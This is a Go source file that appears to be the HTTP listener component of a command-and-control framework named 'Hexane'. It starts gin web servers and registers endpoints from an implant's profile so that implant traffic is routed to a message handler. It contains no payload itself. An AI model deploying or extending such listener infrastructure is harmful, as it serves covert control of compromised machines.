package main

import (
	"fmt"
	"github.com/gin-gonic/gin"
	"io/ioutil"
	"strconv"
)

func ParseHeaders(context *gin.Context) []Headers {
	var heads []Headers

	for key, headers := range context.Request.Header {
		for _, value := range headers {

			vals := Headers{key, value}
			heads = append(heads, vals)
		}
	}
	return heads
}

func (h *HexaneConfig) ServerRoutine(context *gin.Context) {
	var (
		err       error
		body, rsp []byte
	)

	if body, err = ioutil.ReadAll(context.Request.Body); err != nil {
		WrapMessage("ERR", err.Error())
	}

	if rsp, err = MessageRoutine(body); err != nil {
		WrapMessage("ERR", err.Error())
	}

	//context.String(200, base64.StdEncoding.WithPadding(base64.NoPadding).EncodeToString(rsp))
	context.String(200, string(rsp))
}

func (h *HexaneConfig) UpdateServerEndpoints(server *ServerConfig, profile *HttpConfig) {

	chanNewEndp := make(chan string)
	defer close(chanNewEndp)

	go func() {
		for endp := range chanNewEndp {
			server.Handle.GET(endp, func(context *gin.Context) {
				h.ServerRoutine(context)
			})
		}
	}()

	for _, newEndp := range profile.Endpoints {
		endpointExists := false

		for _, existingEndp := range server.Endpoints {
			if existingEndp == newEndp {

				endpointExists = true
				break
			}
		}
		if !endpointExists {
			server.Endpoints = append(server.Endpoints, newEndp)
			chanNewEndp <- newEndp
		}
	}
}

func (h *HexaneConfig) StartNewServer(profile *HttpConfig) {
	var err error

	Handle := gin.Default()

	for _, endp := range profile.Endpoints {
		Handle.GET(endp, func(context *gin.Context) {
			h.ServerRoutine(context)
		})
	}
	go func() {
		if err = Handle.Run(profile.Address + ":" + strconv.Itoa(profile.Port)); err != nil {
			WrapMessage("ERR", err.Error())
		}
	}()

	h.AddServer(Handle, profile)
	WrapMessage("INF", fmt.Sprintf("server started on %s:%d", profile.Address, profile.Port))
}

func (h *HexaneConfig) HttpServerHandler() {

	profile := h.Implant.Profile.(*HttpConfig)
	serverExists := false

	for Head := Servers.Head; Head != nil; Head = Head.Next {
		if Head.Address == profile.Address && Head.Port == profile.Port {

			serverExists = true
			h.UpdateServerEndpoints(Head, profile)
			break
		}
	}
	if !serverExists {
		h.StartNewServer(profile)
	}
}
